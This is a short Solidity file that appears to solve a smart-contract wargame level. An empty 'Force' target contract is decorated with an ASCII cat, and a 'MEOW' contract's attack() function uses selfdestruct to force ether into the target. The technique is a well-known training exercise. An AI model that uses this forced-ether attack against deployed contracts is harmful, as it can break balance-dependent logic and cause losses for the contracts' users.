pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
contract MEOW{
    Force addr;
    constructor(Force _addr) public{
        addr=_addr;
    }

          
     function attack() public payable {
       
        address payable add = payable(address(addr));
        selfdestruct(add);
    }

}
